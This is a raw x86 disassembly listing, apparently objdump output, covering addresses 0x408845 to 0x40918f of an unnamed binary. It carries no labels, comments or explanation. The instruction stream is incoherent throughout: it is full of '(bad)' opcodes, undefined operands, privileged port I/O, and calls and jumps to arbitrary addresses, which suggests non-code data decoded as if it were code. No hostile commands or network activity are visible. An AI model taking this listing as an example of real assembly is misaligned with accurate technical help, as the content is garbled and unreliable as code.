  408845:	inc    ebx
  408847:	push   es
  408848:	call   0xff3ca8b9
  40884d:	push   ebx
  40884f:	loop   0x408847
  408851:	(bad)  
  408852:	cmp    edi,esp
  408854:	jne    0x4087ff
  408856:	or     esp,edi
  408858:	(bad)  
  408859:	mov    ch,0x2e
  40885b:	hlt    
  40885c:	(bad)  
  40885d:	jmp    DWORD PTR [esi]
  40885f:	push   0xfc19ffa8
  408864:	mov    ah,0xec
  408866:	sar    ebx,0xfe
  408869:	call   0x3f321c
  40886e:	mov    ecx,0xb9f7e7a5
  408873:	sti    
  408874:	out    0x55,eax
	...
  40888a:	add    BYTE PTR [edi],dh
  40888c:	cld    
  40888d:	(bad)  
  40888e:	push   DWORD PTR [ebx]
  408890:	fcomi  st,st(6)
  408892:	(bad)  
  408893:	jns    0x40887b
  408895:	dec    ecx
  408896:	test   eax,0xb5fefb59
  40889b:	mov    esi,0xb9fffef3
  4088a0:	gs or  edi,edi
  4088a3:	xor    ecx,DWORD PTR [edx]
  4088a5:	call   0xff3c40e7
  4088aa:	inc    DWORD PTR [ebx-0x46000912]
  4088b0:	out    0x2d,al
  4088b2:	test   eax,0xff390ca7
  4088b7:	bound  edx,QWORD PTR [ebx]
  4088b9:	sub    edx,DWORD PTR [ecx-0x3f]
  4088bc:	cld    
  4088bd:	cmp    bh,bh
  4088bf:	xor    dh,BYTE PTR [edi]
  4088c1:	sub    edi,DWORD PTR [eax+0x2c]
  4088c4:	sub    eax,DWORD PTR [ebx]
  4088c6:	leave  
  4088c7:	in     eax,0x57
  4088c9:	add    edx,DWORD PTR [ebp+0x2c]
  4088cc:	dec    edi
  4088cd:	test   ah,al
  4088cf:	fwait
  4088d0:	rol    DWORD PTR [ebx],1
  4088d2:	push   0xffffffb8
  4088d4:	dec    esp
  4088d5:	scas   al,BYTE PTR es:[edi]
  4088d6:	pop    es
  4088d7:	jg     0x4088c4
  4088d9:	popa   
  4088da:	inc    DWORD PTR [eax+0xffbbdb2]
  4088e0:	mov    ?,edx
  4088e2:	inc    eax
  4088e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088e4:	ins    BYTE PTR es:[edi],dx
  4088e5:	out    dx,al
  4088e6:	outs   dx,DWORD PTR ds:[esi]
  4088e7:	mov    esi,0xdaff03ea
  4088ec:	xor    ebp,DWORD PTR [ebx]
  4088ee:	test   BYTE PTR [eax],0x0
	...
  408901:	add    BYTE PTR [eax],al
  408903:	add    BYTE PTR [edx-0x6c],bl
  408906:	cmp    BYTE PTR [eax+0x79],ch
  408909:	push   edx
  40890a:	ret    0xc0ff
  40890d:	sub    DWORD PTR [ebx],eax
  40890f:	add    BYTE PTR [edi],ah
  408911:	jl     0x4088c1
  408913:	pop    es
  408914:	dec    edi
  408915:	jg     0x40894d
  408917:	push   DWORD PTR [eax]
  408919:	lods   al,BYTE PTR ds:[esi]
  40891a:	lods   eax,DWORD PTR ds:[esi]
  40891b:	sti    
  40891c:	sub    BYTE PTR [esi],ch
  40891e:	or     ebp,eax
  408920:	je     0x4088a7
  408922:	cmp    bh,bh
  408924:	out    dx,al
  408925:	call   0xa0bc8928
  40892a:	es and ebx,0xff2ff6
  408931:	scas   al,BYTE PTR es:[edi]
  408932:	mov    ebp,0xadf457fb
  408937:	(bad)  
  408939:	jne    0x408942
  40893b:	call   0x43f9ce
  408940:	lods   al,BYTE PTR ds:[esi]
  408941:	add    ch,BYTE PTR [ecx]
  408943:	or     BYTE PTR [edx],ah
  408945:	test   ecx,ebp
  408947:	add    esp,DWORD PTR [edi-0x58c453c3]
  40894d:	add    ch,cl
  40894f:	add    ebp,eax
  408951:	mov    esi,0x2a037fc
  408956:	jmp    0xe8eb3a08
  40895b:	lods   eax,DWORD PTR ds:[esi]
  40895c:	test   al,0xaa
  40895e:	call   0x396f73e9
  408963:	mov    DWORD PTR [edx],esp
  408965:	das    
  408966:	(bad)  
  408967:	aaa    
	...
  40897c:	add    BYTE PTR [eax-0x6f4e2a2d],dl
  408982:	xor    al,0x54
  408984:	cmp    BYTE PTR [edi-0x58fbbcca],cl
  40898a:	pop    es
  40898b:	test   eax,0x1c27a6b0
  408990:	mov    DWORD PTR [edx],esp
  408992:	daa    
  408993:	mov    dh,0x37
  408995:	pusha  
  408996:	shl    DWORD PTR [ebx-0x7f],cl
  408999:	push   ebx
  40899a:	sub    al,0x9e
  40899c:	aaa    
  40899d:	div    DWORD PTR [ebx]
  40899f:	sbb    al,0x14
  4089a1:	dec    eax
  4089a2:	scas   al,BYTE PTR es:[edi]
  4089a3:	fsubr  QWORD PTR [ebx]
  4089a5:	shl    DWORD PTR [edi-0x7a],0x37
  4089a9:	cs jle 0x408a25
  4089ac:	das    
  4089ad:	xor    BYTE PTR [edx+eiz*8],dh
  4089b0:	inc    ebx
  4089b1:	mov    bl,0xe0
  4089b3:	imul   edi,DWORD PTR [ecx+0x13],0xa737662c
  4089ba:	scas   al,BYTE PTR es:[edi]
  4089bb:	jmp    FWORD PTR [ebx+0x76463410]
  4089c1:	or     BYTE PTR [esi+0x3d],ch
  4089c4:	das    
  4089c5:	add    BYTE PTR [esi+eax*2],dh
  4089c8:	jno    0x4089c1
  4089ca:	sub    edi,DWORD PTR [esi]
  4089cc:	aaa    
  4089cd:	lock lods eax,DWORD PTR ds:[esi]
  4089cf:	jmp    eax
  4089d1:	mov    esp,0x982ec943
  4089d6:	xor    esi,DWORD PTR [ebp-0xcc77e7]
  4089dc:	adc    eax,ecx
  4089de:	pop    ebx
  4089df:	call   DWORD PTR [esi]
	...
  4089f5:	add    BYTE PTR [eax+0x2b02f7bd],dl
  4089fb:	xor    al,0x75
  4089fd:	add    eax,0xe979b68b
  408a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a03:	dec    ecx
  408a04:	ret    0xa4e5
  408a07:	int    0x8a
  408a09:	std    
  408a0a:	and    eax,0xa353fc3e
  408a0f:	test   al,0x17
  408a11:	ficom  WORD PTR [edi-0x5]
  408a14:	out    0x2d,eax
  408a16:	push   es
  408a17:	xor    al,0xff
  408a19:	pusha  
  408a1a:	addr16 aaa 
  408a1c:	push   0xffc27bc2
  408a21:	mov    ebp,0x2828a377
  408a26:	mov    ds:0x8ce17533,eax
  408a2b:	(bad)  
  408a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a2e:	xchg   ecx,eax
  408a2f:	stos   BYTE PTR es:[edi],al
  408a30:	cli    
  408a31:	loopne 0x408a9e
  408a33:	xor    esp,DWORD PTR [edi-0x15]
  408a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a37:	add    al,BYTE PTR [eax-0x18050872]
  408a3d:	fidiv  DWORD PTR [ecx+0x33]
  408a40:	call   DWORD PTR [ecx]
  408a42:	xchg   edi,eax
  408a43:	clc    
  408a44:	inc    eax
  408a45:	jmp    0xc0b077bb
  408a4a:	jmp    0x408a7e
  408a4c:	(bad)  
  408a4d:	fsubr  QWORD PTR [edx+ebp*1+0x33d95e00]
  408a54:	push   0xffc20efd
  408a59:	rol    BYTE PTR [eax],0x0
	...
  408a6c:	add    BYTE PTR [eax],al
  408a6e:	add    BYTE PTR [esi-0x71fffffe],ah
  408a74:	in     al,dx
  408a75:	je     0x408a7f
  408a77:	push   esi
  408a78:	(bad)  
  408a7a:	push   DWORD PTR [ecx-0x6e038b14]
  408a80:	jb     0x408a89
  408a82:	call   0x3f2c83
  408a87:	xchg   edi,eax
  408a88:	rol    DWORD PTR [ebx],0x0
  408a8b:	or     ecx,DWORD PTR [eax-0x4e40014]
  408a91:	out    0xf4,eax
  408a93:	push   ebp
  408a94:	in     al,dx
  408a95:	dec    BYTE PTR [ebx]
  408a97:	jle    0x408afc
  408a99:	cmp    BYTE PTR [eax-0x1],ch
  408a9c:	cmp    BYTE PTR [eax+0x0],al
  408a9f:	fimul  WORD PTR ds:[eax+0x4ff881ab]
  408aa6:	push   eax
  408aa7:	test   BYTE PTR [esi],0x0
  408aaa:	out    dx,eax
  408aab:	xor    BYTE PTR [edi+0x36],bl
  408aae:	cmp    cl,bh
  408ab0:	push   es
  408ab1:	push   eax
  408ab2:	(bad)  
  408ab3:	mov    ebx,0x4250e7fe
  408ab8:	clc    
  408ab9:	(bad)  
  408aba:	pop    eax
  408abb:	out    0x5,al
  408abd:	add    bh,ch
  408abf:	rcr    BYTE PTR [esi+0x3b],1
  408ac2:	cmp    cl,BYTE PTR [edi-0x4400affa]
  408ac8:	(bad)  
  408ac9:	out    0x3c,eax
  408acb:	add    bh,al
  408acd:	(bad)  
  408ace:	call   0x3f5a79
	...
  408ae7:	add    bh,dh
  408ae9:	les    eax,FWORD PTR [edi]
  408aeb:	add    BYTE PTR [ebx-0x57c1385],bl
  408af1:	jmp    0x75ff:0xda40069
  408af8:	push   ss
  408af9:	fimul  WORD PTR [ecx-0x77088e5c]
  408aff:	inc    ebp
  408b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b01:	xlat   BYTE PTR ds:[ebx]
  408b02:	test   eax,0xb570019
  408b07:	call   0xff75541e
  408b0c:	jge    0x408b0a
  408b0e:	xor    al,0x75
  408b10:	lahf   
  408b11:	ret    
  408b12:	mov    bh,bh
  408b14:	loopne 0x408af6
  408b16:	test   eax,0xb8ed81b
  408b1b:	call   0xff759c46
  408b20:	enter  0x378e,0xff
  408b24:	cmp    ah,BYTE PTR [ebx]
  408b26:	sub    esp,DWORD PTR [ebx+eax*1-0x1a36caf7]
  408b2d:	daa    
  408b2e:	add    edx,DWORD PTR [ebp+0x1c]
  408b31:	or     BYTE PTR [ecx-0x51df5c3c],al
  408b37:	or     ecx,DWORD PTR [edi-0x6f009744]
  408b3d:	xor    al,0x43
  408b3f:	mov    db7,esp
  408b42:	add    eax,DWORD PTR [eax]
  408b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b45:	mov    ds:0xc624fbbd,al
  408b4a:	adc    eax,DWORD PTR [eax]
	...
  408b60:	add    bl,bh
  408b62:	and    DWORD PTR [esi*2-0x4518769],esi
  408b69:	dec    edi
  408b6a:	inc    esp
  408b6b:	imul   edi,edi,0xfbbdb258
  408b71:	mov    edi,0xa740f9ef
  408b76:	cwde   
  408b77:	scas   al,BYTE PTR es:[edi]
  408b78:	sti    
  408b79:	dec    edi
  408b7a:	test   al,0x68
  408b7c:	(bad)  
  408b7d:	cmp    BYTE PTR [ebx],cl
  408b7f:	lods   al,BYTE PTR ds:[esi]
  408b80:	push   DWORD PTR [eax]
  408b82:	xor    BYTE PTR [ebp+0x50],0x28
  408b86:	cs or  ebp,eax
  408b89:	in     al,0x62
  408b8b:	xor    al,0xff
  408b8d:	lar    edi,WORD PTR ds:0xd131105d
  408b94:	mov    ebp,ecx
  408b96:	ret    
  408b97:	call   0x416f05d0
  408b9c:	popf   
  408b9d:	dec    esi
  408b9e:	xor    DWORD PTR [esi-0x2d],eax
  408ba1:	mov    BYTE PTR [ebx],al
  408ba3:	jmp    0x3612b4cc
  408ba8:	scas   al,BYTE PTR es:[edi]
  408ba9:	test   al,0x1a
  408bab:	mov    ecx,DWORD PTR [ebx-0x28]
  408bae:	xor    BYTE PTR [ecx],dl
  408bb0:	jo     0x408bbb
  408bb2:	xor    DWORD PTR [esi],ebx
  408bb4:	stos   DWORD PTR es:[edi],eax
  408bb5:	cmp    ah,ch
  408bb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bb8:	add    eax,eax
  408bba:	mov    dh,0xc
  408bbc:	sub    esp,DWORD PTR [edx+0x5c]
  408bbf:	push   es
  408bc0:	xor    al,0x57
  408bc2:	call   0x0:0x3e8
	...
  408bd9:	add    BYTE PTR [eax+0x1a34996f],bh
  408bdf:	sti    
  408be0:	add    BYTE PTR [edx+0x1ce6306f],al
  408be6:	xor    eax,0xff33de69
  408beb:	popa   
  408bec:	adc    eax,ebp
  408bee:	xor    BYTE PTR [ecx],0x54
  408bf1:	xor    BYTE PTR [edi+0x703392e7],cl
  408bf7:	rcl    DWORD PTR [eax+0x5],cl
  408bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bfb:	pop    ds
  408bfc:	ja     0x408bd2
  408bfe:	popa   
  408bff:	mov    dh,0xe0
  408c01:	sbb    eax,edi
  408c03:	cmp    ah,BYTE PTR [esi+0x46b23f33]
  408c09:	xor    ecx,DWORD PTR [eax+0x30]
  408c0c:	sbb    al,0x30
  408c0e:	dec    edi
  408c0f:	call   0xab:0x3a383346
  408c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c17:	aad    0x71
  408c19:	and    BYTE PTR [edi+eax*2],ah
  408c1c:	add    BYTE PTR [ebp+0x41],dh
  408c1f:	xor    BYTE PTR [ecx-0x2d],ch
  408c22:	aad    0xb5
  408c24:	pop    es
  408c25:	push   ecx
  408c26:	nop
  408c27:	arpl   di,di
  408c29:	pop    esi
  408c2a:	mov    al,ch
  408c2c:	sti    
  408c2d:	ret    
  408c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c2f:	pushf  
  408c30:	sbb    DWORD PTR [esi+0x3e],ecx
  408c33:	or     al,ch
  408c35:	or     esi,DWORD PTR [edi+ebp*1-0x635b2c01]
  408c3c:	and    dh,BYTE PTR [esi]
	...
  408c52:	add    BYTE PTR [esi],bl
  408c54:	or     al,ch
  408c56:	xlat   BYTE PTR ds:[ebx]
  408c57:	xchg   ebp,eax
  408c58:	das    
  408c59:	call   DWORD PTR [ebx+0x1e1b9ca4]
  408c5f:	push   cs
  408c60:	or     al,ch
  408c62:	jecxz  0x408cd9
  408c64:	das    
  408c65:	inc    DWORD PTR [ecx-0x16bf13ca]
  408c6b:	adc    cl,BYTE PTR [edx]
  408c6d:	push   DWORD PTR [esp+ebp*4+0x27]
  408c71:	sti    
  408c72:	not    ebp
  408c74:	das    
  408c75:	push   0xffc2892f
  408c7a:	push   edx
  408c7b:	mov    BYTE PTR [eax],dh
  408c7d:	jne    0x408c70
  408c7f:	lods   al,BYTE PTR ds:[esi]
  408c80:	push   ds
  408c81:	(bad)  
  408c82:	(bad)  
  408c83:	mov    ch,0x9a
  408c85:	mov    ebp,0x692f6213
  408c8a:	in     eax,0xb5
  408c8c:	mov    ch,0x7
  408c8e:	rcl    edi,1
  408c90:	xor    bh,bh
  408c92:	mov    dh,0x95
  408c94:	mov    ch,0xfb
  408c96:	scas   al,BYTE PTR es:[edi]
  408c97:	pop    ds
  408c98:	pop    es
  408c99:	call   0xff7054b9
  408c9e:	mov    al,0xe2
  408ca0:	push   es
  408ca1:	add    BYTE PTR [eax+eax*8],bh
  408ca4:	push   ds
  408ca5:	and    DWORD PTR [ebp+0xff379c],0xfc458229
  408caf:	mov    ?,ebx
  408cb1:	je     0x408cc3
  408cb3:	cdq    
  408cb4:	push   0xb
  408cb6:	call   0x408cbb
	...
  408ccb:	add    BYTE PTR [esi+0x5b],dl
  408cce:	(bad)  
  408ccf:	call   DWORD PTR ds:0x41850ec3
  408cd5:	push   es
  408cd6:	add    BYTE PTR [eax],al
  408cd8:	sar    DWORD PTR [edx],1
  408cda:	test   DWORD PTR [eax],0xc700030e
  408ce0:	inc    ebx
  408ce1:	idiv   esi
  408ce3:	pop    es
  408ce4:	inc    BYTE PTR [edx]
  408ce6:	push   0x0
  408ce8:	in     al,0x2
  408cea:	push   0x0
  408cec:	in     al,0x2
  408cee:	lea    eax,[ebp-0x4e]
  408cf1:	push   ebx
  408cf2:	mov    WORD PTR [ebp-0x1134e],es
  408cf8:	(bad)  
  408cf9:	repz je 0x408cf4
  408cfc:	test   eax,0xb4e8fb6a
  408d01:	pop    edx
  408d02:	(bad)  
  408d03:	push   DWORD PTR [ebp-0x58fa8c3e]
  408d09:	das    
  408d0a:	add    BYTE PTR [eax],al
  408d0c:	mov    cs,WORD PTR [edx+0x6bf28e0]
  408d12:	push   DWORD PTR [ebp-0x72]
  408d15:	or     ch,BYTE PTR ds:0x4ff459a9
  408d1b:	mov    edi,DWORD PTR [esi]
  408d1d:	scas   al,BYTE PTR es:[edi]
  408d1e:	test   ah,dh
  408d20:	xor    esp,esi
  408d22:	(bad)  
  408d23:	push   eax
  408d24:	mov    WORD PTR [esi],cs
  408d26:	sbb    eax,0x88f419a9
  408d2b:	test   DWORD PTR [esi],ebx
  408d2d:	in     al,dx
  408d2e:	(bad)  
  408d2f:	inc    DWORD PTR [eax]
	...
  408d45:	ss js  0x408cec
  408d48:	jmp    FWORD PTR [ecx]
  408d4a:	(bad)  
  408d4b:	jmp    DWORD PTR [edi-0x59]
  408d4e:	ss in  al,dx
  408d50:	inc    eax
  408d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d52:	jl     0x408dcb
  408d54:	lock cmp BYTE PTR [ebp+0x1fb2ff31],al
  408d5b:	sbb    esi,DWORD PTR [esi+0x4f]
  408d5e:	mov    ch,0x30
  408d60:	mov    DWORD PTR [edx],esp
  408d62:	mov    al,0x38
  408d64:	call   DWORD PTR [eax]
  408d66:	push   edx
  408d67:	add    ebp,DWORD PTR [eax-0x42]
  408d6a:	loopne 0x408d2e
  408d6c:	inc    DWORD PTR [ecx]
  408d6e:	(bad)  
  408d6f:	xor    al,0xf7
  408d71:	clc    
  408d72:	mov    esp,0xd3a37530
  408d77:	int3   
  408d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d79:	call   0xcfc6086a
  408d7e:	in     al,dx
  408d7f:	xor    bh,bh
  408d81:	and    al,0x9f
  408d83:	pop    ds
  408d84:	not    eax
  408d86:	in     al,0x3
  408d88:	je     0x408d21
  408d8a:	xchg   ebx,eax
  408d8b:	add    eax,DWORD PTR [eax]
  408d8d:	rcl    ch,1
  408d8f:	fwait
  408d90:	in     al,0x7d
  408d92:	pop    edx
  408d93:	add    edi,edi
  408d95:	cli    
  408d96:	pop    ss
  408d97:	cmp    edi,edi
  408d99:	test   al,0x2c
  408d9b:	mov    dh,0x7
  408d9d:	pop    DWORD PTR [eax]
  408d9f:	cmp    edi,edi
  408da1:	cwde   
  408da2:	add    DWORD PTR [edx],0x0
  408da5:	and    BYTE PTR [ebp-0x65],0xee
	...
  408dbd:	add    ch,cl
  408dbf:	fiadd  DWORD PTR [ebx]
  408dc1:	(bad)  
  408dc2:	cmp    al,BYTE PTR [edi+0x38]
  408dc5:	(bad)  
  408dc6:	js     0x408e04
  408dc8:	mov    dh,0x7
  408dca:	jg     0x408d54
  408dcc:	cmp    bh,bh
  408dce:	push   0x58e86d98
  408dd3:	je     0x408e05
  408dd5:	add    bl,dl
  408dd7:	sub    ebx,DWORD PTR [ebx-0x69fdaf01]
  408ddd:	jno    0x408d9e
  408ddf:	daa    
  408de0:	jecxz  0x408da4
  408de2:	inc    eax
  408de3:	sub    al,0x5c
  408de5:	sbb    esi,DWORD PTR [eax]
  408de7:	sub    eax,0xfaba308e
  408dec:	nop
  408ded:	jne    0x408e4d
  408def:	sub    eax,0x2a79b7e
  408df4:	xchg   BYTE PTR [ecx-0x71],dh
  408df7:	sbb    eax,0x2c10c2b3
  408dfc:	pushf  
  408dfd:	sbb    edx,DWORD PTR [eax]
  408dff:	sub    eax,0xfa7a305e
  408e04:	inc    eax
  408e05:	(bad)  
  408e06:	out    dx,al
  408e07:	sub    al,0x4e
  408e09:	xor    BYTE PTR [edx],bh
  408e0b:	push   ds
  408e0c:	ds xor al,ch
  408e0f:	sbb    DWORD PTR [ecx],ebp
  408e11:	addr16 loopne 0x408e40
  408e14:	ss jbe 0x408de6
  408e17:	xor    al,0x2e
  408e19:	xor    BYTE PTR [edi-0x37cfb28a],bh
  408e1f:	sub    al,0x54
  408e21:	xor    eax,DWORD PTR [eax]
	...
  408e37:	mov    eax,0x3230162c
  408e3c:	dec    BYTE PTR ds:0x3d1aa8b6
  408e42:	xor    DWORD PTR [eax-0x688a01d4],ebp
  408e48:	xor    al,0xf6
  408e4a:	das    
  408e4b:	(bad)
  408e4f:	nop
  408e50:	sub    al,0x2c
  408e52:	sub    al,0x7e
  408e54:	cmp    ebx,edi
  408e56:	das    
  408e57:	sub    BYTE PTR [esp+ebx*2],0x30
  408e5b:	(bad)  
  408e5c:	and    BYTE PTR [edi+0x4],dl
  408e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e60:	cmp    DWORD PTR [ebx+0x71d5a700],ebp
  408e66:	and    BYTE PTR [eax-0x4a],ah
  408e69:	jmp    esp
  408e6b:	mov    esp,0x80aea839
  408e70:	idiv   DWORD PTR [edi-0x75bc5e3]
  408e76:	jecxz  0x408ee3
  408e78:	sub    al,0x4f
  408e7a:	sub    DWORD PTR [ecx+0x64],0xbc5b8eff
  408e81:	addr16 jmp 0x11feaa2b
  408e87:	into   
  408e88:	call   0x2d3577cd
  408e8d:	jne    0x408e70
  408e8f:	lods   al,BYTE PTR ds:[esi]
  408e90:	in     eax,0xc8
  408e92:	mov    ax,0x67ca
  408e96:	call   0xc1feaa3f
	...
  408eaf:	add    BYTE PTR [ecx-0x2b16bf18],bl
  408eb5:	sub    al,0x75
  408eb7:	icebp  
  408eb8:	mov    WORD PTR [ecx],ss
  408eba:	leave  
  408ebb:	ds nop
  408ebd:	sbb    bh,BYTE PTR ds:0xc92b888d
  408ec3:	sub    edx,ebx
  408ec5:	sub    edx,DWORD PTR [edx+esi*2-0x79]
  408ec9:	jg     0x408e8f
  408ecb:	sbb    eax,0xe969d4d9
  408ed0:	push   ds
  408ed1:	or     edi,edi
  408ed3:	xchg   esp,eax
  408ed4:	lods   al,BYTE PTR ds:[esi]
  408ed5:	and    ebx,DWORD PTR [ebp+0x48]
  408ed8:	js     0x408f05
  408eda:	mov    DWORD PTR [eax+edx*8+0x7b603577],esp
  408ee1:	ret    0x61ff
  408ee4:	xchg   esi,eax
  408ee5:	jle    0x408f0f
  408ee7:	sub    BYTE PTR [ebx-0x7e16c07e],ah
  408eed:	jg     0x408eaa
  408eef:	jmp    0xb3a89198
  408ef4:	jle    0x408eb8
  408ef6:	(bad)  
  408ef7:	dec    DWORD PTR [eax+0x4e76b00e]
  408efd:	dec    DWORD PTR [edx]
  408eff:	rcr    BYTE PTR [edx+0x56803f6c],0xff
  408f06:	push   cs
  408f07:	test   BYTE PTR [ecx+0x7effffff],bh
  408f0d:	mov    ds,ecx
  408f0f:	cmp    cl,BYTE PTR [edi+0xede806]
	...
  408f29:	call   0x4fc1:0x3d5a0006
  408f30:	call   0x3f31ac
  408f35:	mov    esi,0xfe006756
  408f3a:	or     edi,DWORD PTR [esi+0x40195b68]
  408f40:	add    BYTE PTR [esi],bh
  408f42:	fdiv   QWORD PTR [eax+ecx*1+0x66]
  408f46:	jns    0x408f10
  408f48:	jmp    DWORD PTR [ecx+0x37]
  408f4b:	addr16 add esi,edi
  408f4e:	or     edi,DWORD PTR [esi+0x40197168]
  408f54:	add    BYTE PTR [esi],bh
  408f56:	fdiv   QWORD PTR [eax+ecx*1+0x66]
  408f5a:	test   eax,ecx
  408f5c:	inc    DWORD PTR [ecx-0x5e5c4df9]
  408f62:	fsub   st(2),st
  408f64:	inc    ebx
  408f65:	sar    DWORD PTR es:[ecx],1
  408f68:	inc    ecx
  408f69:	mov    esi,0x2841e753
  408f6e:	(bad)  
  408f6f:	dec    DWORD PTR [edx]
  408f71:	into   
  408f72:	jno    0x408fa7
  408f74:	push   esi
  408f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f76:	popa   
  408f77:	lods   al,BYTE PTR ds:[esi]
  408f78:	inc    DWORD PTR [ecx+0x7e684f55]
  408f7e:	push   es
  408f7f:	out    dx,eax
  408f80:	mov    esi,0x4139e1d6
  408f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f86:	sbb    edx,ebx
  408f88:	(bad)  
  408f89:	cli    
  408f8a:	and    ebx,DWORD PTR [ebx]
  408f8c:	push   ebp
	...
  408fa1:	add    BYTE PTR [edi+0x41],bl
  408fa4:	sub    eax,0x31acf58
  408fa9:	out    dx,eax
  408faa:	sbb    esp,eax
  408fac:	sbb    al,0x3a
  408fae:	out    0x1b,al
  408fb0:	sar    esi,cl
  408fb2:	shl    BYTE PTR [ebx],cl
  408fb4:	sbb    eax,DWORD PTR [ecx+0x6f]
  408fb7:	mov    DWORD PTR ds:0x2cbccae8,ebp
  408fbd:	(bad)  
  408fbe:	cmp    al,0x1b
  408fc0:	lds    edi,FWORD PTR [edi+0x69]
  408fc3:	sbb    esi,DWORD PTR [esi-0xf589607]
  408fc9:	mov    edi,0xff2cb15e
  408fce:	adc    BYTE PTR [esi+0x30a0385d],ch
  408fd4:	xchg   BYTE PTR [ebp+0x0],al
  408fd7:	leave  
  408fd8:	sub    al,0x6a
  408fda:	popf   
  408fdb:	shl    BYTE PTR [esi+0x2ddcff07],1
  408fe1:	(bad)  
  408fe2:	call   0x5b3f703c
  408fe7:	xor    ebx,DWORD PTR [ebx]
  408fe9:	mov    ecx,0x6a2cf0d9
  408fee:	mov    bl,0xd8
  408ff0:	mov    dh,0x7
  408ff2:	mov    edi,0xc0ff2dd0
  408ff7:	xchg   ebx,eax
  408ff8:	clc    
  408ff9:	cmp    ah,BYTE PTR [esi+0x1b]
  408ffc:	sub    al,0x35
  408ffe:	aaa    
  408fff:	inc    edx
  409000:	ret    0xa9ff
  409003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409004:	cli    
  409005:	out    0x0,eax
	...
  40901b:	(bad)  
  40901c:	es sub al,0xff
  40901f:	(bad)  
  409021:	call   0x1c43766
  409026:	add    BYTE PTR [edi-0x5d396fe],ah
  40902c:	cli    
  40902d:	ror    BYTE PTR [edx+edi*2],1
  409030:	sub    esi,edx
  409032:	sub    al,0xfa
  409034:	es into 
  409036:	mov    dh,0xa0
  409038:	sbb    ch,BYTE PTR [ebx+0x63]
  40903b:	pusha  
  40903c:	sub    DWORD PTR [esi],ebx
  40903e:	into   
  40903f:	outs   dx,DWORD PTR ds:[esi]
  409040:	inc    esp
  409041:	in     eax,dx
  409042:	add    edi,edx
  409044:	jge    0x409003
  409046:	and    BYTE PTR [ebx+0x52],0x9e
  40904a:	sub    al,0x40
  40904c:	ja     0x409072
  40904e:	xor    bh,dl
  409050:	sub    DWORD PTR [esp+edx*1],ebx
  409053:	xor    BYTE PTR [edi-0x501ee424],ch
  409059:	call   0xee833c61
  40905e:	xchg   BYTE PTR [ebp+0x4],ah
  409061:	jmp    0x70ff7869
  409066:	add    esp,DWORD PTR [edi+0x6a44e902]
  40906c:	cs pop esi
  40906e:	add    al,0xa7
  409070:	add    al,bl
  409072:	add    edi,DWORD PTR [ebp+0x2]
  409075:	ret    
  409076:	add    edi,DWORD PTR [ebp+0x2]
  409079:	je     0x409041
  40907b:	aam    0xd1
  40907d:	imul   eax,DWORD PTR [esi+0x0],0x0
	...
  409094:	shl    DWORD PTR [eax],cl
  409096:	ss sub al,0x77
  409099:	sub    DWORD PTR [ebx+ebp*1+0x1b24aec8],esi
  4090a0:	lahf   
  4090a1:	scas   eax,DWORD PTR es:[edi]
  4090a2:	call   0x9d833caa
  4090a7:	push   es
  4090a8:	mov    esi,0xa703eafe
  4090ad:	call   0xb5fe:0x2e7db07
  4090b4:	test   al,0x1a
  4090b6:	add    BYTE PTR [edx-0x6600d7f6],dh
  4090bc:	rcpps  xmm1,XMMWORD PTR [ebp-0xd04894]
  4090c3:	ficom  WORD PTR [ebx-0x2e]
  4090c6:	out    0x2,eax
  4090c8:	add    eax,0x2660ff28
  4090cd:	xor    esi,edi
  4090cf:	(bad)  
  4090d0:	mov    WORD PTR [edx],ds
  4090d2:	or     DWORD PTR [ebx-0x1695d874],0x283af32c
  4090dc:	mov    ds:0x7499b527,eax
  4090e1:	daa    
  4090e2:	call   FWORD PTR [esi+0x6de7fbf6]
  4090e8:	(bad)  
  4090e9:	daa    
  4090ea:	jmp    DWORD PTR [eax+0x26]
  4090ed:	pop    ds
  4090ee:	test   DWORD PTR [esi+0x10ff9ccc],0xe940ed09
	...
  40910c:	add    BYTE PTR [ebp-0x43890f93],bh
  409112:	daa    
  409113:	(bad)  
  409114:	fdiv   st(0),st
  409116:	pop    ds
  409117:	imul   eax,DWORD PTR [esp+ecx*8-0x709376d9],0x94eff2f
  409122:	sub    BYTE PTR [edi-0x56],ah
  409125:	rol    edx,1
  409127:	(bad)  
  409128:	cmp    eax,0x36f73256
  40912d:	jl     0x409156
  40912f:	jne    0x40910e
  409131:	lods   al,BYTE PTR ds:[esi]
  409132:	mov    eax,0x798c26a4
  409137:	test   DWORD PTR [ecx],edx
  409139:	je     0x409162
  40913b:	inc    DWORD PTR [ebx-0x2db4655c]
  409141:	jecxz  0x40916a
  409143:	inc    BYTE PTR [eax]
  409145:	jecxz  0x409135
  409147:	idiv   bh
  409149:	cdq    
  40914a:	fdiv   QWORD PTR [esp+ecx*1-0x5a]
  40914e:	das    
  40914f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409150:	(bad)  
  409151:	jns    0x4090f9
  409153:	test   ah,bl
  409155:	popa   
  409156:	fdiv   st(6),st
  409158:	lea    eax,[ebx]
  40915a:	in     al,0xf6
  40915c:	call   FWORD PTR [ecx+0x53]
  40915f:	addr16 pop esp
  409161:	xchg   ebp,eax
  409162:	cmp    eax,0xf3e3feff
  409167:	idiv   bh
  409169:	sbb    esp,ebx
  40916b:	xor    al,0x70
  40916d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40916e:	cmp    eax,0xe7ff
	...
  409183:	add    BYTE PTR [eax],al
  409185:	add    BYTE PTR [esi-0x5e],ch
  409188:	(bad)  
  409189:	push   DWORD PTR ds:0xcd1973c3
  40918f:	call   0x7503:0xdc19f7df
